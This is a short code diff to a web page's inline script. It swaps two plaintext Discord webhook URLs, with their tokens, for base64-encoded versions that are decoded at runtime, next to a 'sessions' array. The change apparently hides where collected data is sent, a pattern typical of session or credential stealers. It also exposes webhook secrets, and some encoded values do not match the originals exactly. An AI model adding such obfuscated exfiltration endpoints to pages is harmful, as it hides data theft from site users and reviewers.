@@ -95,10 +95,12 @@
 </div>
 
 <script>
-const hardcodedWebhooks = [
-  "https://discord.com/api/webhooks/1356725515104424099/5c9m_Cm6ZJlRh1jOELn1VEepc8f-YSymQCzy3htF7aoGB5hIdjZBH_ZJwjC9gMRqfW1_",
-  "https://discord.com/api/webhooks/1365365136239366265/mxlYCx2akrzOOlK2kSjUXB8areX-Om0jpG-0ogzF6DWLkjlRPlJAuXv0T7Jff5q1A94e"
+const encodedWebhooks = [
+  "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NjcyNTUxNTEwNDQyNDA5OS81YzltX0NtNlpKbFJoMWpPRUxuMVZFZXBjOGYtWVN5bVFDenkzaHRGN2FvR0I1aElkalpC SF9aSndqQzlnaVBSZlcxXw==",
+  "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NTM2NTEzNjIzOTM2NjI2NS9teGxZQ3gyYWtyek9PbEsya1NqVVhCOGFyZVgtT20wanBKcC0wb2d6RjZEV0xramxSU GxKQXVYdjBUN0pmZjVxMUE5NGU="
 ];
+
+const hardcodedWebhooks = encodedWebhooks.map(b64 => atob(b64));
 
 let sessions = [];
 
